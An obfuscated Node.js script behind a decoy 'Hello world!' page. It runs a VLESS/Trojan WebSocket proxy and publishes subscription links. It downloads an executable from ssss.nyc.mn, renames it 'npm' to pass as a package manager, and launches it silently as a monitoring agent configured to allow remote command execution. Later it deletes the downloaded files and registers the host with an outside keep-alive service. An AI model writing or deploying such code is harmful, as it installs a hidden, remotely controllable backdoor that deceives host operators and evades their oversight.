const _0x59fb42=_0x333d;(function(_0x224dc5,_0xe68b00){const _0xd9cf2e=_0x333d,_0x3574c8=_0x224dc5();while(!![]){try{const _0x7df67e=parseInt(_0xd9cf2e(0x1a3))/0x1+-parseInt(_0xd9cf2e(0x199))/0x2+-parseInt(_0xd9cf2e(0x135))/0x3*(-parseInt(_0xd9cf2e(0x131))/0x4)+-parseInt(_0xd9cf2e(0x12e))/0x5+-parseInt(_0xd9cf2e(0x191))/0x6+parseInt(_0xd9cf2e(0x130))/0x7+parseInt(_0xd9cf2e(0x155))/0x8;if(_0x7df67e===_0xe68b00)break;else _0x3574c8['push'](_0x3574c8['shift']());}catch(_0x544bff){_0x3574c8['push'](_0x3574c8['shift']());}}}(_0x4b44,0xf36a2));function _0x4b44(){const _0x572e22=['8.8.4.4','Unknown','substr','11ae6efd-12e8-47ef-92cc-10483282168b','join','stream','https://amd64.ssss.nyc.mn/agent','application/dns-json','\x20-p\x20','&fp=chrome&type=ws&host=','country','npm\x20is\x20already\x20running,\x20skip\x20running...','NEZHA_KEY','then','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','text/html','aarch64','once','Not\x20Found\x0a','true','find','slice','&path=%2F','PORT','index.html','writeHead','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','/bin/bash','trojan://','pop','config.yaml','base64','http','child_process','axios','listen','every','arm','map','sha224','message','8443','includes','1234.abc.com',':443?encryption=none&security=tls&sni=','send','length','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','vless://','11810928gIUEri','npm\x20download\x20successfully','hex','Hello\x20world!','connection','setsid\x20nohup\x20./npm\x20-s\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2096','1468034xqOGsI','arm64','reduce','buffer','Answer','https://dns.google/resolve?name=','post','readUInt8','connect','npm','918630TRJjbU','6376830ePyCIR','2083','1112720dYCNGD','5502028LJAKfd','Status','NAME','decode','3IilZJg','text/plain','WSPATH','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','UUID','finish','url','pipe','readUInt16BE','toString','close','&type=A','443','utf8','concat','replace','Server\x20is\x20running\x20on\x20port\x20','utf-8','end','split','writeFileSync','unlink','2087','npm\x20is\x20running','error','https://','log','path','data','https://speed.cloudflare.com/meta','net','type','20174400gRfAxg','client_secret:\x20','createHash','2053','env','AUTO_ACCESS','arch','https://amd64.ssss.nyc.mn/v1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','write','asOrganization'];_0x4b44=function(){return _0x572e22;};return _0x4b44();}const os=require('os'),http=require(_0x59fb42(0x180)),fs=require('fs'),axios=require(_0x59fb42(0x182)),net=require(_0x59fb42(0x153)),path=require(_0x59fb42(0x150)),crypto=require('crypto'),{Buffer}=require(_0x59fb42(0x19c)),{exec,execSync}=require(_0x59fb42(0x181)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x59fb42(0x139)]||_0x59fb42(0x163),NEZHA_SERVER=process[_0x59fb42(0x159)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x59fb42(0x159)][_0x59fb42(0x16c)]||'',DOMAIN=process[_0x59fb42(0x159)]['DOMAIN']||_0x59fb42(0x18b),AUTO_ACCESS=process[_0x59fb42(0x159)][_0x59fb42(0x15a)]||!![],WSPATH=process[_0x59fb42(0x159)][_0x59fb42(0x137)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x59fb42(0x159)]['SUB_PATH']||'sub',NAME=process[_0x59fb42(0x159)][_0x59fb42(0x133)]||'Hug',PORT=process[_0x59fb42(0x159)][_0x59fb42(0x177)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2204cc=_0x59fb42;try{const _0x36ae60=await axios['get'](_0x2204cc(0x152)),_0x523946=_0x36ae60['data'];ISP=(_0x523946[_0x2204cc(0x16a)]+'-'+_0x523946[_0x2204cc(0x15f)])[_0x2204cc(0x144)](/ /g,'_');}catch(_0x332cb2){ISP=_0x2204cc(0x161);}};GetISP();const httpServer=http['createServer']((_0x42817f,_0x2ab833)=>{const _0x520d96=_0x59fb42;if(_0x42817f[_0x520d96(0x13b)]==='/'){const _0x370ee5=path[_0x520d96(0x164)](__dirname,_0x520d96(0x178));fs['readFile'](_0x370ee5,_0x520d96(0x142),(_0x554ea2,_0x355685)=>{const _0x11c5cf=_0x520d96;if(_0x554ea2){_0x2ab833[_0x11c5cf(0x179)](0xc8,{'Content-Type':_0x11c5cf(0x16f)}),_0x2ab833[_0x11c5cf(0x147)](_0x11c5cf(0x194));return;}_0x2ab833[_0x11c5cf(0x179)](0xc8,{'Content-Type':_0x11c5cf(0x16f)}),_0x2ab833[_0x11c5cf(0x147)](_0x355685);});return;}else{if(_0x42817f['url']==='/'+SUB_PATH){const _0x1b8a11=_0x520d96(0x190)+UUID+'@'+DOMAIN+_0x520d96(0x18c)+DOMAIN+_0x520d96(0x169)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x4327f1=_0x520d96(0x17c)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x520d96(0x169)+DOMAIN+_0x520d96(0x176)+WSPATH+'#'+NAME+'-'+ISP,_0x2ebd7c=_0x1b8a11+'\x0a'+_0x4327f1,_0x56ce30=Buffer['from'](_0x2ebd7c)[_0x520d96(0x13e)](_0x520d96(0x17f));_0x2ab833[_0x520d96(0x179)](0xc8,{'Content-Type':_0x520d96(0x136)}),_0x2ab833[_0x520d96(0x147)](_0x56ce30+'\x0a');}else _0x2ab833['writeHead'](0x194,{'Content-Type':_0x520d96(0x136)}),_0x2ab833['end'](_0x520d96(0x172));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x59fb42(0x144)](/-/g,''),DNS_SERVERS=[_0x59fb42(0x160),'1.1.1.1'];function resolveHost(_0x3fcacf){return new Promise((_0x27da51,_0x3b8d89)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x3fcacf)){_0x27da51(_0x3fcacf);return;}let _0x4b95f5=0x0;function _0x3afbdf(){const _0x3b7f18=_0x333d;if(_0x4b95f5>=DNS_SERVERS[_0x3b7f18(0x18e)]){_0x3b8d89(new Error('Failed\x20to\x20resolve\x20'+_0x3fcacf+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x3ee447=DNS_SERVERS[_0x4b95f5];_0x4b95f5++;const _0xbff8c5=_0x3b7f18(0x19e)+encodeURIComponent(_0x3fcacf)+_0x3b7f18(0x140);axios['get'](_0xbff8c5,{'timeout':0x1388,'headers':{'Accept':_0x3b7f18(0x167)}})['then'](_0x56de6d=>{const _0x1f4742=_0x3b7f18,_0x34c199=_0x56de6d['data'];if(_0x34c199[_0x1f4742(0x132)]===0x0&&_0x34c199[_0x1f4742(0x19d)]&&_0x34c199[_0x1f4742(0x19d)][_0x1f4742(0x18e)]>0x0){const _0x5eef48=_0x34c199[_0x1f4742(0x19d)][_0x1f4742(0x174)](_0x57add5=>_0x57add5[_0x1f4742(0x154)]===0x1);if(_0x5eef48){_0x27da51(_0x5eef48[_0x1f4742(0x151)]);return;}}_0x3afbdf();})['catch'](_0x5399e2=>{_0x3afbdf();});}_0x3afbdf();});}function handleVlessConnection(_0x1fc78f,_0x299687){const _0x5f2f9c=_0x59fb42,[_0x4d6924]=_0x299687,_0x46a06f=_0x299687[_0x5f2f9c(0x175)](0x1,0x11);if(!_0x46a06f[_0x5f2f9c(0x184)]((_0x48737,_0x3226c6)=>_0x48737==parseInt(uuid[_0x5f2f9c(0x162)](_0x3226c6*0x2,0x2),0x10)))return![];let _0x3d9e9f=_0x299687[_0x5f2f9c(0x175)](0x11,0x12)[_0x5f2f9c(0x1a0)]()+0x13;const _0x4e15f1=_0x299687[_0x5f2f9c(0x175)](_0x3d9e9f,_0x3d9e9f+=0x2)[_0x5f2f9c(0x13d)](0x0),_0x4f82e8=_0x299687[_0x5f2f9c(0x175)](_0x3d9e9f,_0x3d9e9f+=0x1)[_0x5f2f9c(0x1a0)](),_0xccfa20=_0x4f82e8==0x1?_0x299687[_0x5f2f9c(0x175)](_0x3d9e9f,_0x3d9e9f+=0x4)['join']('.'):_0x4f82e8==0x2?new TextDecoder()[_0x5f2f9c(0x134)](_0x299687[_0x5f2f9c(0x175)](_0x3d9e9f+0x1,_0x3d9e9f+=0x1+_0x299687[_0x5f2f9c(0x175)](_0x3d9e9f,_0x3d9e9f+0x1)['readUInt8']())):_0x4f82e8==0x3?_0x299687[_0x5f2f9c(0x175)](_0x3d9e9f,_0x3d9e9f+=0x10)[_0x5f2f9c(0x19b)]((_0x46e072,_0x24dc31,_0x558b00,_0x4b567a)=>_0x558b00%0x2?_0x46e072[_0x5f2f9c(0x143)](_0x4b567a[_0x5f2f9c(0x175)](_0x558b00-0x1,_0x558b00+0x1)):_0x46e072,[])[_0x5f2f9c(0x186)](_0x5db7b6=>_0x5db7b6['readUInt16BE'](0x0)[_0x5f2f9c(0x13e)](0x10))['join'](':'):'';_0x1fc78f[_0x5f2f9c(0x18d)](new Uint8Array([_0x4d6924,0x0]));const _0x399dcb=createWebSocketStream(_0x1fc78f);return resolveHost(_0xccfa20)[_0x5f2f9c(0x16d)](_0x29214d=>{const _0x320c8c=_0x5f2f9c;net[_0x320c8c(0x1a1)]({'host':_0x29214d,'port':_0x4e15f1},function(){const _0x12e4fd=_0x320c8c;this[_0x12e4fd(0x15e)](_0x299687[_0x12e4fd(0x175)](_0x3d9e9f)),_0x399dcb['on']('error',()=>{})[_0x12e4fd(0x13c)](this)['on'](_0x12e4fd(0x14d),()=>{})[_0x12e4fd(0x13c)](_0x399dcb);})['on'](_0x320c8c(0x14d),()=>{});})['catch'](_0x5456ed=>{const _0x52d4a3=_0x5f2f9c;net[_0x52d4a3(0x1a1)]({'host':_0xccfa20,'port':_0x4e15f1},function(){const _0x4f4aca=_0x52d4a3;this['write'](_0x299687[_0x4f4aca(0x175)](_0x3d9e9f)),_0x399dcb['on'](_0x4f4aca(0x14d),()=>{})['pipe'](this)['on'](_0x4f4aca(0x14d),()=>{})[_0x4f4aca(0x13c)](_0x399dcb);})['on'](_0x52d4a3(0x14d),()=>{});}),!![];}function handleTrojanConnection(_0x4b5766,_0x359b23){const _0x3b2180=_0x59fb42;try{if(_0x359b23[_0x3b2180(0x18e)]<0x3a)return![];const _0x26594b=_0x359b23[_0x3b2180(0x175)](0x0,0x38)['toString'](),_0xe648c9=[UUID];let _0x5b8fea=null;for(const _0x544353 of _0xe648c9){const _0x513c89=crypto[_0x3b2180(0x157)](_0x3b2180(0x187))['update'](_0x544353)['digest'](_0x3b2180(0x193));if(_0x513c89===_0x26594b){_0x5b8fea=_0x544353;break;}}if(!_0x5b8fea)return![];let _0x57ac46=0x38;_0x359b23[_0x57ac46]===0xd&&_0x359b23[_0x57ac46+0x1]===0xa&&(_0x57ac46+=0x2);const _0x46ae46=_0x359b23[_0x57ac46];if(_0x46ae46!==0x1)return![];_0x57ac46+=0x1;const _0x57bfce=_0x359b23[_0x57ac46];_0x57ac46+=0x1;let _0x16d392,_0x59649c;if(_0x57bfce===0x1)_0x16d392=_0x359b23[_0x3b2180(0x175)](_0x57ac46,_0x57ac46+0x4)[_0x3b2180(0x164)]('.'),_0x57ac46+=0x4;else{if(_0x57bfce===0x3){const _0x3790e5=_0x359b23[_0x57ac46];_0x57ac46+=0x1,_0x16d392=_0x359b23[_0x3b2180(0x175)](_0x57ac46,_0x57ac46+_0x3790e5)[_0x3b2180(0x13e)](),_0x57ac46+=_0x3790e5;}else{if(_0x57bfce===0x4)_0x16d392=_0x359b23[_0x3b2180(0x175)](_0x57ac46,_0x57ac46+0x10)['reduce']((_0x40baa6,_0x5af799,_0x45fee4,_0x3adafe)=>_0x45fee4%0x2?_0x40baa6[_0x3b2180(0x143)](_0x3adafe[_0x3b2180(0x175)](_0x45fee4-0x1,_0x45fee4+0x1)):_0x40baa6,[])[_0x3b2180(0x186)](_0xcaed16=>_0xcaed16['readUInt16BE'](0x0)['toString'](0x10))[_0x3b2180(0x164)](':'),_0x57ac46+=0x10;else return![];}}_0x59649c=_0x359b23[_0x3b2180(0x13d)](_0x57ac46),_0x57ac46+=0x2;_0x57ac46<_0x359b23[_0x3b2180(0x18e)]&&_0x359b23[_0x57ac46]===0xd&&_0x359b23[_0x57ac46+0x1]===0xa&&(_0x57ac46+=0x2);const _0x339ef0=createWebSocketStream(_0x4b5766);return resolveHost(_0x16d392)[_0x3b2180(0x16d)](_0x2e7f73=>{const _0x176292=_0x3b2180;net[_0x176292(0x1a1)]({'host':_0x2e7f73,'port':_0x59649c},function(){const _0x54f9ed=_0x176292;_0x57ac46<_0x359b23[_0x54f9ed(0x18e)]&&this[_0x54f9ed(0x15e)](_0x359b23['slice'](_0x57ac46)),_0x339ef0['on'](_0x54f9ed(0x14d),()=>{})[_0x54f9ed(0x13c)](this)['on']('error',()=>{})[_0x54f9ed(0x13c)](_0x339ef0);})['on']('error',()=>{});})['catch'](_0xd62ac8=>{const _0x1409b9=_0x3b2180;net[_0x1409b9(0x1a1)]({'host':_0x16d392,'port':_0x59649c},function(){const _0x331c3e=_0x1409b9;_0x57ac46<_0x359b23[_0x331c3e(0x18e)]&&this[_0x331c3e(0x15e)](_0x359b23[_0x331c3e(0x175)](_0x57ac46)),_0x339ef0['on'](_0x331c3e(0x14d),()=>{})[_0x331c3e(0x13c)](this)['on'](_0x331c3e(0x14d),()=>{})[_0x331c3e(0x13c)](_0x339ef0);})['on'](_0x1409b9(0x14d),()=>{});}),!![];}catch(_0x610f63){return![];}}wss['on'](_0x59fb42(0x195),(_0xee8fa2,_0xd6f33c)=>{const _0x2cd3d4=_0x59fb42,_0x1f7281=_0xd6f33c[_0x2cd3d4(0x13b)]||'';_0xee8fa2[_0x2cd3d4(0x171)](_0x2cd3d4(0x188),_0x5dc97d=>{const _0x36e502=_0x2cd3d4;if(_0x5dc97d[_0x36e502(0x18e)]>0x11&&_0x5dc97d[0x0]===0x0){const _0x49f479=_0x5dc97d[_0x36e502(0x175)](0x1,0x11),_0x254587=_0x49f479['every']((_0x45bdba,_0x7699c4)=>_0x45bdba==parseInt(uuid[_0x36e502(0x162)](_0x7699c4*0x2,0x2),0x10));if(_0x254587){!handleVlessConnection(_0xee8fa2,_0x5dc97d)&&_0xee8fa2[_0x36e502(0x13f)]();return;}}!handleTrojanConnection(_0xee8fa2,_0x5dc97d)&&_0xee8fa2[_0x36e502(0x13f)]();})['on'](_0x2cd3d4(0x14d),()=>{});});const getDownloadUrl=()=>{const _0x1b52d4=_0x59fb42,_0x1c26e3=os[_0x1b52d4(0x15b)]();return _0x1c26e3===_0x1b52d4(0x185)||_0x1c26e3===_0x1b52d4(0x19a)||_0x1c26e3===_0x1b52d4(0x170)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x1b52d4(0x15c):_0x1b52d4(0x166);},downloadFile=async()=>{const _0x1de1d9=_0x59fb42;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3c275f=getDownloadUrl(),_0x1a7288=await axios({'method':'get','url':_0x3c275f,'responseType':_0x1de1d9(0x165)}),_0x3ed654=fs['createWriteStream'](_0x1de1d9(0x1a2));return _0x1a7288[_0x1de1d9(0x151)]['pipe'](_0x3ed654),new Promise((_0x36223a,_0x60b8d2)=>{const _0x2b6ec7=_0x1de1d9;_0x3ed654['on'](_0x2b6ec7(0x13a),()=>{const _0x26cad5=_0x2b6ec7;console[_0x26cad5(0x14f)](_0x26cad5(0x192)),exec('chmod\x20+x\x20npm',_0xb0de81=>{if(_0xb0de81)_0x60b8d2(_0xb0de81);_0x36223a();});}),_0x3ed654['on'](_0x2b6ec7(0x14d),_0x60b8d2);});}catch(_0x3d81ce){throw _0x3d81ce;}},runnz=async()=>{const _0x2b7bd0=_0x59fb42;try{const _0xc2fefd=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x2b7bd0(0x146)});if(_0xc2fefd['trim']()!==''){console[_0x2b7bd0(0x14f)](_0x2b7bd0(0x16b));return;}}catch(_0x8d9612){}await downloadFile();let _0x3d0625='',_0x197421=[_0x2b7bd0(0x141),_0x2b7bd0(0x189),_0x2b7bd0(0x198),_0x2b7bd0(0x14b),_0x2b7bd0(0x12f),_0x2b7bd0(0x158)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5b2500=_0x197421[_0x2b7bd0(0x18a)](NEZHA_PORT)?'--tls':'';_0x3d0625=_0x2b7bd0(0x196)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2b7bd0(0x168)+NEZHA_KEY+'\x20'+_0x5b2500+_0x2b7bd0(0x18f);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5782ff=NEZHA_SERVER[_0x2b7bd0(0x18a)](':')?NEZHA_SERVER[_0x2b7bd0(0x148)](':')[_0x2b7bd0(0x17d)]():'',_0x20f0f9=_0x197421[_0x2b7bd0(0x18a)](_0x5782ff)?_0x2b7bd0(0x173):'false',_0x4e2b68=_0x2b7bd0(0x156)+NEZHA_KEY+_0x2b7bd0(0x197)+NEZHA_SERVER+_0x2b7bd0(0x138)+_0x20f0f9+_0x2b7bd0(0x15d)+UUID;fs[_0x2b7bd0(0x149)](_0x2b7bd0(0x17e),_0x4e2b68);}_0x3d0625=_0x2b7bd0(0x17a);}else{console[_0x2b7bd0(0x14f)](_0x2b7bd0(0x16e));return;}}try{exec(_0x3d0625,{'shell':_0x2b7bd0(0x17b)},_0x345399=>{const _0x267a6b=_0x2b7bd0;if(_0x345399)console[_0x267a6b(0x14d)]('npm\x20running\x20error:',_0x345399);else console[_0x267a6b(0x14f)](_0x267a6b(0x14c));});}catch(_0x19ddbe){console['error']('error:\x20'+_0x19ddbe);}};async function addAccessTask(){const _0x2c7799=_0x59fb42;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2390a6=_0x2c7799(0x14e)+DOMAIN;try{const _0x5a8844=await axios[_0x2c7799(0x19f)]('https://oooo.serv00.net/add-url',{'url':_0x2390a6},{'headers':{'Content-Type':'application/json'}});console[_0x2c7799(0x14f)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x3b106f){}}function _0x333d(_0x26e56c,_0x30599e){_0x26e56c=_0x26e56c-0x12e;const _0x4b44e1=_0x4b44();let _0x333d73=_0x4b44e1[_0x26e56c];return _0x333d73;}const delFiles=()=>{const _0xa32b0a=_0x59fb42;fs[_0xa32b0a(0x14a)](_0xa32b0a(0x1a2),()=>{}),fs[_0xa32b0a(0x14a)](_0xa32b0a(0x17e),()=>{});};httpServer[_0x59fb42(0x183)](PORT,()=>{const _0x524733=_0x59fb42;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x524733(0x145)+PORT);});
